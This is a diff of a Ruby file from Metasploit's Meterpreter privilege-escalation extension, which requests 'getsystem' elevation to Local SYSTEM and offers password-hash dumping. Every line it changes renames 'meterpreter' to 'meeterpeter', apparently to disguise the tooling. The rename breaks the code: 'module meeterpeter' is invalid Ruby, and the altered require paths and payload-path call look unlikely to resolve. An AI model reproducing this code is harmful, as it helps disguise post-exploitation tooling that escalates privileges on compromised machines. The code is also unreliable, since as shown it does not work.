@@ -1,18 +1,18 @@
 # -*- coding: binary -*-
 
-require 'rex/post/meterpreter/extensions/priv/tlv'
-require 'rex/post/meterpreter/extensions/priv/passwd'
-require 'rex/post/meterpreter/extensions/priv/fs'
+require 'rex/post/meeterpeter/extensions/priv/tlv'
+require 'rex/post/meeterpeter/extensions/priv/passwd'
+require 'rex/post/meeterpeter/extensions/priv/fs'
 
 module Rex
 module Post
-module Meterpreter
+module meeterpeter
 module Extensions
 module Priv
 
 ###
 #
-# This meterpreter extensions a privilege escalation interface that is capable
+# This meeterpeter extensions a privilege escalation interface that is capable
 # of doing things like dumping password hashes and performing local
 # exploitation.
 #
@@ -38,14 +38,14 @@ class Priv < Extension
   end
 
   #
-  # Attempt to elevate the meterpreter to Local SYSTEM
+  # Attempt to elevate the meeterpeter to Local SYSTEM
   #
   def getsystem( technique=0 )
     request = Packet.create_request( 'priv_elevate_getsystem' )
 
     elevator_name = Rex::Text.rand_text_alpha_lower( 6 )
 
-    elevator_path = MetasploitPayloads.meterpreter_path('elevator', client.binary_suffix)
+    elevator_path = MetasploitPayloads.meeterpeter_path('elevator', client.binary_suffix)
     if elevator_path.nil?
       raise RuntimeError, "elevator.#{binary_suffix} not found", caller
     end
@@ -73,7 +73,7 @@ class Priv < Extension
         client.framework.db.report_note(
           :host => client.sock.peerhost,
           :workspace => client.framework.db.workspace,
-          :type => "meterpreter.getsystem",
+          :type => "meeterpeter.getsystem",
           :data => {:technique => technique}
         ) rescue nil
       end
